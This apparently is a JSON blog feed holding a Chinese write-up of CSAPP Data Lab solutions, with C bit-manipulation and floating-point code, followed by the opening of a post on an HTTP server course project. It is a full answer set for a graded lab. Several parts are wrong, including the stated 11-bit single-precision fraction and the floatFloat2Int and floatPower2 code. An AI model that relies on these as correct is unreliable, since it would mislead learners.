            "content_html": "<p>部分的题目我参考了一下网上的内容（出处已注明），其他的均为自己实现（有的题目的实现过程可能会有些繁琐），部分 dlc 检测出来可能会报些 error，但是 btest 均能过。</p>\n<blockquote>\n<p>没有 TA 可太难了！自己实现了一天多，终于苟完了。不算完美，但也能看吧。</p>\n</blockquote>\n<h2 id=\"bitXor\"><a href=\"#bitXor\" class=\"headerlink\" title=\"bitXor\"></a>bitXor</h2><pre><code class=\"c\">/*\n * bitXor - x^y using only ~ and &amp;\n *   Example: bitXor(4, 5) = 1\n *   Legal ops: ~ &amp;\n *   Max ops: 14\n *   Rating: 1\n */\nint bitXor(int x, int y)\n&#123;\n   /**\n    * x + y = ~( ~x &amp; ~y)\n    */\n   return ~((~(x &amp; ~y)) &amp; (~(y &amp; ~x)));\n&#125;\n</code></pre>\n<p>bitXor 要求我们使用位操作来实现<code>^</code>运算符。根据运算定律我们知道: <code>a ^ b = (a &amp; (~b)) | (b &amp; (~a))</code>。但是问题来了，我们这里不允许使用<code>|</code>，只能用<code>~</code>和<code>&amp;</code>。那么我们就必须使用这两个操作符来实现<code>|</code>运算。<br>通过德摩根定律我们知道：<code>a | b = ~((~a) &amp; (~b))</code>。这不就解决问题了嘛，所以将这两个式子综合一下，最后的结果是<code>~((~(x &amp; ~y)) &amp; (~(y &amp; ~x)))</code></p>\n<h2 id=\"tmin\"><a href=\"#tmin\" class=\"headerlink\" title=\"tmin\"></a>tmin</h2><pre><code class=\"c\">/*\n * tmin - return minimum two&#39;s complement integer\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void)\n&#123;\n   /**\n    * the most significant bit = 1, others = 0, so (1 &lt;&lt; 31)\n    */\n   return (1 &lt;&lt; 31);\n&#125;\n</code></pre>\n<p>这题要求我们返回最小的补码整数，返回类型为<code>int</code>。首先，在二进制补码表示中，最高位的权值为-1，其他位的权值为 1。因此，最小的补码整数 tmin 的最高位为 1，其他位为 0。而题目中<code>int</code>类型为 32 位，因此只要返回<code>(1 &lt;&lt; 31)</code>即可。</p>\n<h2 id=\"isTmax\"><a href=\"#isTmax\" class=\"headerlink\" title=\"isTmax\"></a>isTmax</h2><pre><code class=\"c\">/*\n * isTmax - returns 1 if x is the maximum, two&#39;s complement number,\n *     and 0 otherwise\n *   Legal ops: ! ~ &amp; ^ | +\n *   Max ops: 10\n *   Rating: 1\n */\nint isTmax(int x)\n&#123;\n   /**\n    * Tmax ^ Tmin = 0xffffffff, ~0xffffffff = 0x0, !0x0 = 0x1\n    */\n   // return !(~(x ^ (1 &lt;&lt; 31)));\n\n   /**\n    * ~Tmax = Tmin -&gt; ~Tmin + 1 = Tmin 且 Tmin != 0\n    */\n   int num = ~x;\n   return !(num ^ (~num + 1)) &amp; !!num;\n&#125;\n</code></pre>\n<p>tmax 是二进制补码中最大的数，通过分析这个数的特点，我们可以完成这道题目。</p>\n<ol>\n<li>该数除了最高位是 0 外，其他位均是 1。因此该数和(1&lt;&lt;31)（也就是 tmin）的亦或（或者和）为<code>0xffffffff</code>。<code>0xffffffff</code>按位取反得到<code>0x0</code>，而<code>0x0</code>按位取反得到<code>0x1</code>。但是其他的数并没有这个特性。</li>\n</ol>\n<pre><code class=\"c\">return !(~(x ^ (1 &lt;&lt; 31)));\n</code></pre>\n<ol start=\"2\">\n<li>该数取反后得到 tmin，tmin 的一个特点是 tmin 和 -tmin 的表示相同。因此两者亦或得到 0。还有一个树也有这样的特性，也就是 0。因此我们需要排除 0 的可能性。我们使用<code>&amp;</code>操作符来实现两种特性的叠加。我本没有想到该方法，是从这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">知乎帖子</span>学习到的。</li>\n</ol>\n<pre><code class=\"c\">int num = ~x;\nreturn !(num ^ (~num + 1)) &amp; !!num;\n</code></pre>\n<p>但是题目不允许在该题中使用移位运算符，因此只能使用方法二。</p>\n<h2 id=\"allOddBits\"><a href=\"#allOddBits\" class=\"headerlink\" title=\"allOddBits\"></a>allOddBits</h2><pre><code class=\"c\">/*\n * allOddBits - return 1 if all odd-numbered bits in word set to 1\n *   where bits are numbered from 0 (least significant) to 31 (most significant)\n *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 12\n *   Rating: 2\n */\nint allOddBits(int x)\n&#123;\n   /**\n    * tear the number into 4 parts, get rid of the other digits except 0xaa\n    * if the results are all the same, then compare it with 0xaa, if there are the same, xor returns 0\n    * otherwise not all odd bits in word set is set to 1\n    */\n   int first = (x &gt;&gt; 24) &amp; 0xaa;\n   int second = (x &gt;&gt; 16) &amp; 0xaa;\n   int third = (x &gt;&gt; 8) &amp; 0xaa;\n   int fourth = x &amp; 0xaa;\n   return !((first &amp; second &amp; third &amp; fourth) ^ 0xaa);\n&#125;\n</code></pre>\n<p>对于单个字节的奇数位，我们可以使用<code>0xaa</code>作为 mask。<br>本题目中我将位打成 4 个部分，每个部分与 mask 相与。如果每个奇数位都是 1 的话，四个部分的比较结果应该相同，都等于<code>0xaa</code>，该值与<code>0xaa</code>异或得到<code>0x0</code>，取<code>!</code>后得到<code>0x1</code>。否则该值不为<code>0xaa</code>，同<code>0xaa</code>亦或得到其他非零值，取<code>!</code>后得到<code>0x0</code>。</p>\n<h2 id=\"negate\"><a href=\"#negate\" class=\"headerlink\" title=\"negate\"></a>negate</h2><pre><code class=\"c\">/*\n * negate - return -x\n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x)\n&#123;\n   return (~x + 1);\n&#125;\n</code></pre>\n<p>该题目中我们需要求解某个数的相反数。在课堂中我们学过，一个数和它相反数的和为 0。那么如何获得其相反数呢？以<code>x</code>为例，我们知道<code>x + ~x = ~0</code>，也就是全 f，然后<code>~0 + 1 = 0</code>。因此，<code>-x</code>的补码表示即为<code>~x + 1</code>。</p>\n<h2 id=\"isAsciiDigit\"><a href=\"#isAsciiDigit\" class=\"headerlink\" title=\"isAsciiDigit\"></a>isAsciiDigit</h2><pre><code class=\"c\">/*\n * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#39;0&#39; to &#39;9&#39;)\n *   Example: isAsciiDigit(0x35) = 1.\n *            isAsciiDigit(0x3a) = 0.\n *            isAsciiDigit(0x05) = 0.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 15\n *   Rating: 3\n */\nint isAsciiDigit(int x)\n&#123;\n   /**\n    * least = (x &amp; 0xf) - 0xa\n    * if least &gt; 0 (with 0 in most significant bit) then least = 0\n    * else least = 1\n    */\n   int least = ((((x &amp; 0xf) + (~0xa + 1)) &gt;&gt; 31) &amp; 0x1);\n   int second = !((x &gt;&gt; 4) ^ 0x3);\n   return least &amp; second;\n&#125;\n</code></pre>\n<p>这里我使用的方法是将该数拆分为最低位和其他位来比较。我们将最低位与<code>0xa</code>相减，如果求得的结果为负数，符号位即为 1，代表该值在 0-9 之间。接下来判断其他位是否为<code>0x3</code>，如果是，则和<code>0x3</code>异或结果为 0，通过逻辑<code>!</code>返回 1。</p>\n<h2 id=\"conditional\"><a href=\"#conditional\" class=\"headerlink\" title=\"conditional\"></a>conditional</h2><pre><code class=\"c\">/*\n * conditional - same as x ? y : z\n *   Example: conditional(2,4,5) = 4\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 16\n *   Rating: 3\n */\nint conditional(int x, int y, int z)\n&#123;\n   /**\n    * judge if x != 0, if true, !!x = 1, return y, otherwise !!x = 0, return z\n    */\n\n   // cond gets all f when !!x == 1\n   int cond = ((!!x) &lt;&lt; 31) &gt;&gt; 31;\n   return (cond &amp; y) | (~cond &amp; z);\n&#125;\n</code></pre>\n<p>这里我们先获取<code>x</code>的值，如果<code>x != 0</code>，则<code>!!x = 0x1</code>，否则为<code>0x0</code>。扩展该值，当该值为<code>0x1</code>时与<code>y</code>相与得到 y。当该值为<code>0x0</code>，取反后与 z 相与得到 z。因为这两个值只取其一，当一边不为 0 时另一边必然为 0，因此两边用<code>|</code>连接。</p>\n<h2 id=\"isLessOrEqual\"><a href=\"#isLessOrEqual\" class=\"headerlink\" title=\"isLessOrEqual\"></a>isLessOrEqual</h2><blockquote>\n<p>本题要求使用最多 24 个运算符，但是这里我使用的过多了，应该会有更好的办法。期待有人指正。</p>\n</blockquote>\n<pre><code class=\"c\">/*\n * isLessOrEqual - if x &lt;= y  then return 1, else return 0\n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y)\n&#123;\n   // first compare their sign bit\n   int sign_x = (x &gt;&gt; 31) &amp; 0x1;\n   int sign_y = (y &gt;&gt; 31) &amp; 0x1;\n   // return true if sign = 1(&gt;0)\n   int sign_diff = sign_x + (~sign_y + 1);\n   int sign_bit = (sign_diff &gt;&gt; 31) &amp; 0x1;\n\n   // then compare the magnitude\n   int mask = (~0) + (0x1 &lt;&lt; 31);\n   int mag_x = x &amp; mask;\n   int mag_y = y &amp; mask;\n   int mag_diff = mag_x + (~mag_y + 1);\n   int mag_sign = !(mag_x ^ mag_y) | ((mag_diff &gt;&gt; 31) &amp; 0x1);\n\n   /**\n    * 2 conditions return true:\n    * 1. sign of x = 1 and sign of y = 0\n    * 2. sign of x and y equals, and magnitude of x &lt;= y\n    */\n   return (((!sign_bit) &amp; sign_diff) | ((!sign_diff) &amp; mag_sign));\n&#125;\n</code></pre>\n<p>这里要分几种情况：</p>\n<ol>\n<li>x 为负数，y 为正数，直接返回<code>0x1</code></li>\n<li>x 和 y 同符号，比较数值部分。x &lt;&#x3D; y 时，返回<code>0x1</code>；x &gt; y 时，返回<code>0x0</code></li>\n<li>x 为正数，y 为负数，返回<code>0x0</code></li>\n</ol>\n<p>其中<code>sign_diff</code>为两数符号位之差，此处分三种情况：</p>\n<ol>\n<li>x 为负数，符号位为 1；y 为正数，符号位为 0。那么两者符号位相减等于<code>0x1</code>，该值的符号位为 0。（这是我们要返回<code>0x1</code>的结果）</li>\n<li>x 为正数，符号位为 0；y 为负数，符号位为 1。那么两者符号位相减等于<code>0xffffffff</code>(-1)，该值的符号位为 1。（我们不要这个结果）</li>\n<li>x 和 y 的符号位相同，两者相减为<code>0x0</code>，该值的符号位为 0。（这里我们要看情况，看<code>x</code>是否和<code>y</code>相等）</li>\n</ol>\n<p>代码中<code>sign_diff</code>为两符号位之差，<code>sign_bit</code>为该做差结果的最高位。当 x 和 y 的符号位不相同时，当<code>sign_diff</code>为<code>0x1</code>且<code>sign_bit</code>为<code>0x0</code>是，我们返回<code>0x1</code>。这也是运算结果<code>|</code>左半边的由来。</p>\n<p>代码中<code>mag_diff</code>为两者数值部分之差，<code>mag_sign</code>为该差值的符号位。当<code>x &lt; y</code>时，<code>mag_diff</code>为<code>0xffffffff</code>。当<code>x == y</code>时，<code>!(mag_x ^ mag_y)</code>为<code>0x1</code>。因此<code>mag_sign = !(mag_x ^ mag_y) | ((mag_diff &gt;&gt; 31) &amp; 0x1)</code>。在判断数值之差部分时，我们需要保证两数符号位之差为<code>0x0</code>，而不是其他（如 x 正 y 负）。因此运算结果右半边的值为<code>(!sign_diff) &amp; mag_sign</code>。</p>\n<p>综上，最后的结果是<code>((!sign_bit) &amp; sign_diff) | ((!sign_diff) &amp; mag_sign)</code>。</p>\n<h2 id=\"logicalNeg\"><a href=\"#logicalNeg\" class=\"headerlink\" title=\"logicalNeg\"></a>logicalNeg</h2><pre><code class=\"c\">/*\n * logicalNeg - implement the ! operator, using all of\n *              the legal operators except !\n *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1\n *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *   Max ops: 12\n *   Rating: 4\n */\nint logicalNeg(int x)\n&#123;\n   /**\n    * if x == 0, x ^ 0x0 = 0\n    */\n   return ((x | (x + ~0 + (~(1 &lt;&lt; 31) + 1))) &gt;&gt; 31) + 1;\n&#125;\n</code></pre>\n<p>这道题的难点在于：</p>\n<ol>\n<li>将 0 映射到 0x1</li>\n<li>将非 0 值映射到 0x0</li>\n</ol>\n<p>在一开始实现时，我的思路是对于 0，可以和<code>0x0</code>异或，判断为 0。但是对于非 0 的数，和<code>0x0</code>异或后还是他自己，我们也不知道 1 落在其中哪个位上，一个个位去找也不现实。那么就需要思考其他的办法。从<code>0x0</code>这个数和其他数的特点下手。这里我参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">这篇博客</span>。</p>\n<p>其给出的思路是：<br>-x 为 x 按位取反再+1。</p>\n<ul>\n<li>如果一个数为全 0，和相反数相<code>|</code>后结果全部是 0，加 1 后得到<code>0x1</code></li>\n<li>否则结果最高位必然含有 1。向右移动 31 位获得<code>~0</code>，再加 1 得到<code>0x0</code></li>\n</ul>\n<p>问题可改为，如何判断一个数全为 0 。注意到，-x 相当于按位取反再加一，如果 x 为 非 0 数，那么 x|(-x) 后必定为 -1 。利用这个性质，即可判断是否为 0 。</p>\n<h2 id=\"howManyBits\"><a href=\"#howManyBits\" class=\"headerlink\" title=\"howManyBits\"></a>howManyBits</h2><pre><code class=\"c\">/* howManyBits - return the minimum number of bits required to represent x in\n *             two&#39;s complement\n *  Examples: howManyBits(12) = 5\n *            howManyBits(298) = 10\n *            howManyBits(-5) = 4\n *            howManyBits(0)  = 1\n *            howManyBits(-1) = 1\n *            howManyBits(0x80000000) = 32\n *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n *  Max ops: 90\n *  Rating: 4\n */\nint howManyBits(int x)\n&#123;\n   /**\n    * divide and conquer\n    * for positive number, the number of bits = the last position of 1 + 1\n    * for negative number, the number of bits = the last position of 1\n    * inverse negative number and deal with it as the same as positive number\n    * 1. judge the sign bit of x, if x is negative, inverse it\n    * 2. judge the high 16 bits, if true(high 16 bits != 0x0), result + 16\n    * 3. judge the high 8 bits, if true, result + 8\n    * 4. judge the high 4 bits, if true, result + 4\n    * 5. judge the high 2 bits, if true, result + 2\n    * 6. judge the high 1 bits, if true, result + 1\n    * 7. judge the last 1 bit, if true, result + !!x\n    * 8. the final sum must + 1\n    * 9. return the result\n    */\n   // neg x if it&#39;s negative\n   int sign = ((x &amp; (1 &lt;&lt; 31)) &gt;&gt; 31);\n   x = (sign &amp; ~x) | (~sign &amp; x);\n\n   int b16, b8, b4, b2, b1, b0;\n\n   // int mask_16 = (1 &lt;&lt; 15) &gt;&gt; 15;\n   b16 = !!(x &gt;&gt; 16) &lt;&lt; 4;\n   x = x &gt;&gt; b16;\n\n   // int mask_8 = 0xff;\n   b8 = !!(x &gt;&gt; 8) &lt;&lt; 3;\n   x = x &gt;&gt; b8;\n\n   // int mask_4 = 0xf;\n   b4 = !!(x &gt;&gt; 4) &lt;&lt; 2;\n   x = x &gt;&gt; b4;\n\n   // int mask_2 = 0x3;\n   b2 = !!(x &gt;&gt; 2) &lt;&lt; 1;\n   x = x &gt;&gt; b2;\n\n   // int mask_1 = 0x1;\n   b1 = !!(x &gt;&gt; 1);\n   x = x &gt;&gt; b1;\n\n   //! judge if the last bit == 1\n   b0 = !!x;\n\n   return b16 + b8 + b4 + b2 + b1 + b0 + 1;\n&#125;\n</code></pre>\n<p>在这个题目中，我们主要采用分而治之的方法。分治方法的几道例题可以参考 CMU 15-213 课程的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwMV9zb2x1dGlvbnMucGRm\">Recitation Slides</span>。</p>\n<p>首先，我们可以看到，如果该数是一个正数，则其最高位必然是 0，该数的位数 &#x3D; 最高一个 1 的位置 + 1；<br>如果该数是一个负数，该数的位数 &#x3D; 最高一个 1 的位置。<br>我们不想那么麻烦，把正负数分开讨论，因此我们把负数翻转过来。</p>\n<p>在这道题中我们采用的方法是：</p>\n<ol>\n<li>判断高 16 位是否有 1（把数向右移动 16 位后，结果不为 0，<code>!!(x &gt;&gt; 16)</code>）。<code>b16 = !!(x &gt;&gt; 16) &lt;&lt; 4</code>。如果是的话，把数值向右移动 16 位<code>(x&gt;&gt;b16)</code>。把<code>b16</code>添加到结果中去。这里一个妙用在于如果<code>!!(x &gt;&gt; 16）= 0x1</code>，<code>!!(x &gt;&gt; 16) &lt;&lt; 4</code>可以直接起到获得数字 16 的方法，无需增加其他的运算。</li>\n<li>判断高 8 位是否有 1，操作同上</li>\n<li>判断高 4 位是否有 1，操作同上</li>\n<li>判断高 2 位是否有 1，操作同上</li>\n<li>判断高 1 位是否有 1，操作同上</li>\n<li>判断该位是否有 1</li>\n<li>结果 + 1（位数 &#x3D; 最高一个 1 的位置 + 1）</li>\n<li>最后把所有判断结果加起来（每次判断的结果都是一个累加的位数，加在一起就是最后的总位数）</li>\n</ol>\n<h2 id=\"浮点数复习\"><a href=\"#浮点数复习\" class=\"headerlink\" title=\"浮点数复习\"></a>浮点数复习</h2><p>在完成浮点数部分的题目之前，我们需要复习一下浮点数的和其表示方法：</p>\n<ul>\n<li>单精度浮点数：1 位符号位 + 8 位阶码(exp) + 11 位尾数(frac)</li>\n<li>双精度浮点数：1 位符号位 + 11 位阶码(exp) + 52 位尾数(frac)</li>\n</ul>\n<p>其中阶码使用移码表示。$bias &#x3D; 2^{k-1}-1$</p>\n<p>浮点数分为三类：</p>\n<ul>\n<li>规格化数：阶码不全为 1 也不全为 0，尾数前有隐含的 1，指数$E&#x3D;exp - bias$，分布在非规格化数外侧</li>\n<li>非规格化数：阶码全为 0，尾数前隐含 0，指数$E&#x3D;1 - bias$，主要分布在靠近 0 侧</li>\n<li>特殊值：阶码全为 1，若尾数全为 0，则为<code>inf</code>，否则为<code>NaN</code></li>\n</ul>\n<h2 id=\"floatScale2\"><a href=\"#floatScale2\" class=\"headerlink\" title=\"floatScale2\"></a>floatScale2</h2><pre><code class=\"c\">// float\n/*\n * floatScale2 - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int&#39;s, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatScale2(unsigned uf)\n&#123;\n   // first get the sign, exp and mag bit of the number\n   unsigned sign = (uf &gt;&gt; 31) &amp; 0x1;\n   unsigned e = (uf &gt;&gt; 23) &amp; ((1 &lt;&lt; 8) - 1);\n   unsigned f = (uf &amp; ((1 &lt;&lt; 23) - 1));\n\n   if (e == 0)\n   &#123;\n      // denormalized number\n      // E = 1 - bias\n      // frac = f\n\n      //! how to multiply a denormalized number? frac * 2!\n      f = f * 2;\n   &#125;\n   else if (e == 0xff)\n   &#123;\n      // special number\n      // if frac = 0, then value = inf\n      if (f == 0)\n      &#123;\n         // frac = 1 / 0;\n         return uf;\n      &#125;\n      else\n      &#123;\n         // if frac != 0, value = NaN\n         return uf;\n      &#125;\n   &#125;\n   else\n   &#123;\n      // normalized number\n      // E = e - bias\n      // value = 1 + f\n\n      e += 1;\n      if (e == ~0)\n      &#123;\n         return uf;\n      &#125;\n   &#125;\n\n   return (sign &lt;&lt; 31) | (e &lt;&lt; 23) | f;\n&#125;\n</code></pre>\n<p>本题目要求是计算一个 unsigned 形式表示的浮点数 <code>* 2</code> 后的表示。在完成这题之前，我们首先把浮点数的几个部分提取出来，分几个情况讨论：</p>\n<ul>\n<li>非规格化数：指数不变，尾数乘 2。<strong>问题来了，这到底是为什么？因为当exp全为0时，exp &#x3D; 0, E &#x3D; 1 - bias, frac &#x3D; 0.f。乘以2就相当于把f左移一位，最高位会进到exp的位置去。如果f最高位是0，左移一位不影响exp（全0）。如果f最高位是1，左移一位后该数变为规格化数，exp变为1，E依然等于 1 - bias。实现了非规格化数到规格化数的平滑过渡（非常重要！）</strong></li>\n<li>规格化数：首先将指数 + 1，然后判断是否为特殊值，若是则返回<code>uf</code>。</li>\n<li>特殊值：<code>e = 0</code>，直接返回<code>uf</code>（根据题目意思）</li>\n</ul>\n<p>将符号位，指数和尾数三个部分拼凑起来，直接返回（本题中无需进行任何计算）。</p>\n<h2 id=\"floatFloat2Int\"><a href=\"#floatFloat2Int\" class=\"headerlink\" title=\"floatFloat2Int\"></a>floatFloat2Int</h2><blockquote>\n<p>本题中不允许使用<code>double</code>类型，我擅自用了，这里应该是不严谨的。</p>\n</blockquote>\n<pre><code class=\"c\">/*\n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf)\n&#123;\n   // first get the sign, exp and mag bit of the number\n   unsigned sign = (uf &gt;&gt; 31) &amp; 0x1;\n   unsigned e = (uf &gt;&gt; 23) &amp; ((1 &lt;&lt; 8) - 1);\n   float f = (uf &amp; ((1 &lt;&lt; 23) - 1)) / (1 &lt;&lt; 23);\n\n   // then get the exact sign, E and value of the number\n   int s = 0;\n   if (sign == 0)\n      s = 1;\n   else\n      s = -1;\n\n   int E = 0;\n   float frac = 0;\n   int bias = 127;\n   if (e == 0)\n   &#123;\n      // denormalized number\n      // E = 1 - bias\n      E = 1 - bias;\n      // frac = f\n      frac = f;\n   &#125;\n   else if (e == 0xff)\n   &#123;\n      //! COMPARE WITH 0XFF INSTEAD OF ~0\n      // special number\n      // if frac = 0, then value = inf\n      if (f == 0)\n      &#123;\n         // frac = 1 / 0;\n         return 0x80000000u;\n      &#125;\n      else\n      &#123;\n         // if frac != 0, value = NaN\n         return 0x80000000u;\n      &#125;\n   &#125;\n   else\n   &#123;\n      // normalized number\n      // E = e - bias\n      E = e - bias;\n      // value = 1 + f\n      frac = 1 + f;\n   &#125;\n   if (E &lt; 0)\n   &#123;\n      return 0;\n   &#125;\n   else if (E &gt; 31)\n   &#123;\n      //! REMEMBER THE SITUATION THAT E &gt; 31\n      return 0x80000000u;\n   &#125;\n\n   return s * frac * (1 &lt;&lt; E);\n&#125;\n</code></pre>\n<p>本题需要返回浮点数转化后的 int 类型数值。需要我们对浮点数的结构有所了解，并且其转化为 int 后需要切割掉小数部分，此外，我们还需要判断指数过大的情况（溢出）。</p>\n<p>本题中我们采用的步骤是：</p>\n<ol>\n<li>提取出浮点数三个部分，计算符号位的值</li>\n<li>当<code>e == 0</code>时，为特殊值的情况，<code>E = 1 - bias</code>，<code>frac = f</code></li>\n<li>当<code>e == 0xff</code>时（注意不是<code>~0/0xffffffff</code>,容易写错！），返回<code>0x80000000u</code></li>\n<li>以上两种情况都不是，则该数为规格化数，<code>E = e - bias; frac = 1 + f;</code></li>\n</ol>\n<p>最后，我们需要进行<strong>特殊情况的分类讨论</strong>：</p>\n<ol>\n<li>E &lt; 0, 则最后生成的结果（无论规格化还是非规格化）肯定是个小数，打头的是 0 那种，要切割为<code>int</code>类型，小数部分就被切割掉了</li>\n<li>E &gt; 31, 超过了指数可以表示的范围（算是溢出了？），返回<code>0x80000000u</code></li>\n<li>正常情况下返回<code>s * frac * (1 &lt;&lt; E)</code></li>\n</ol>\n<h2 id=\"floatPower2\"><a href=\"#floatPower2\" class=\"headerlink\" title=\"floatPower2\"></a>floatPower2</h2><pre><code class=\"c\">/*\n * floatPower2 - Return bit-level equivalent of the expression 2.0^x\n *   (2.0 raised to the power x) for any 32-bit integer x.\n *\n *   The unsigned value that is returned should have the identical bit\n *   representation as the single-precision floating-point number 2.0^x.\n *   If the result is too small to be represented as a denorm, return\n *   0. If too large, return +INF.\n *\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatPower2(int x)\n&#123;\n   //! REMEMEBER THAT FLOATING POINT ITSELF IS IN THE FORMAT (-1)^S * M * 2.0^E\n   // fit x into E\n   x = x + 127;\n   //! MIND THE SITUATION THAT X IS TOO LARGE OR TOO SMALL\n   if (x &gt;= 0xff)\n      x = 0xff;\n   else if (x &lt;= 0)\n      x = 0;\n   unsigned result = (x &lt;&lt; 23);\n   return result;\n&#125;\n</code></pre>\n<p>因为浮点数表示法本身就是以 2 为底，所以本实验就相当于如何把 x 转化为那个 8 位的阶码。因为<code>阶码 = 指数 + bias</code>，这里<code>bias = 127</code>，因此这里<code>E = x + 127</code>。然后和上一题一样，我们需要判断一下 x 的范围是否在<code>0xff</code>和<code>0</code>之间。最后将 x 移动到阶码的位置返回(<code>return x &lt;&lt; 23</code>)即可。</p>\n<h2 id=\"参考实现\"><a href=\"#参考实现\" class=\"headerlink\" title=\"参考实现\"></a>参考实现</h2><p>在完成 data lab 过程中，我参考了部分如下几个博客的实现:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">CSAPP 实验一：DataLab 详细讲解与满分代码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NDk4Nzc0NzU=\">lab1 CSAPP：datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NTc0ODExMTI=\">CSAPP lab1: datalab</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">深入理解计算机系统之位操作实验</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vanlpMnlhL3AvMTU4ODExNzUuaHRtbA==\">CSAPP Data Lab 做题记录（下</span></li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_Project/",
            "url": "https://salvely.github.io/blog/2024/01/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_Project/",
            "title": "Final Project: 多线程HTTP服务器 实现记录",
            "date_published": "2024-01-08T02:32:56.000Z",
            "content_html": "<blockquote>\n<p>进入课程网页的时候意外发现这个 Project 的代码已经被填完了。所以没什么好做的。</p>\n</blockquote>\n<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>多线程网络服务器大致功能：简单的搜索和文件浏览</p>\n<ul>\n<li>Part A: 实现服务器读取文件，统计文件中的单词个数</li>\n<li>Part B: 实现网络连接和 HTTP 请求响应</li>\n<li>Part C: 将 A 和 B 两部分结合起来</li>\n</ul>\n<h2 id=\"Part-A\"><a href=\"#Part-A\" class=\"headerlink\" title=\"Part A\"></a>Part A</h2><h3 id=\"FileReader-cc\"><a href=\"#FileReader-cc\" class=\"headerlink\" title=\"FileReader.cc\"></a><code>FileReader.cc</code></h3><ul>\n<li>简单的文件阅读器</li>\n<li>在构建时读入文件名，<code>read_file</code>将整个文件读入一个<code>string</code></li>\n<li>可以使用<code>POSIX</code>, C 接口或者 C++文件流实现</li>\n</ul>\n<h3 id=\"WordIndex-h-WordIndex-cc\"><a href=\"#WordIndex-h-WordIndex-cc\" class=\"headerlink\" title=\"WordIndex.h &amp; WordIndex.cc\"></a><code>WordIndex.h &amp; WordIndex.cc</code></h3><p>实现一个数据结构，用于存储各个文件中的单词及其出现次数</p>\n<h3 id=\"CrawlFileTree-cc\"><a href=\"#CrawlFileTree-cc\" class=\"headerlink\" title=\"CrawlFileTree.cc\"></a><code>CrawlFileTree.cc</code></h3><p>实现<code>HandleFile</code>函数，其获取一个文件名和一个<code>WordIndex</code>，这个函数读取对应文件，并且将每个单词及其对应的个数存储在<code>WordIndex</code>中</p>\n<h2 id=\"Part-B\"><a href=\"#Part-B\" class=\"headerlink\" title=\"Part B\"></a>Part B</h2><h3 id=\"ServerSocket-cc\"><a href=\"#ServerSocket-cc\" class=\"headerlink\" title=\"ServerSocket.cc\"></a><code>ServerSocket.cc</code></h3><p>实现一个类，这个类包含：</p>\n<ul>\n<li>创建一个服务器端的监听 socket</li>\n<li>从客户端接受新的连接请求</li>\n<li><code>ServerSocket.h</code>中提供了头文件，需要在<code>ServerSocket.cc</code>中实现</li>\n</ul>\n<h3 id=\"HttpConnection-cc\"><a href=\"#HttpConnection-cc\" class=\"headerlink\" title=\"HttpConnection.cc\"></a><code>HttpConnection.cc</code></h3><ul>\n<li><code>HttpConnection</code>处理<code>HTTP</code>连接请求，将该请求转化为一个对象，并且负责将响应写回去</li>\n<li>该函数中主要实现<code>HTTP</code>请求的读取和解析(string 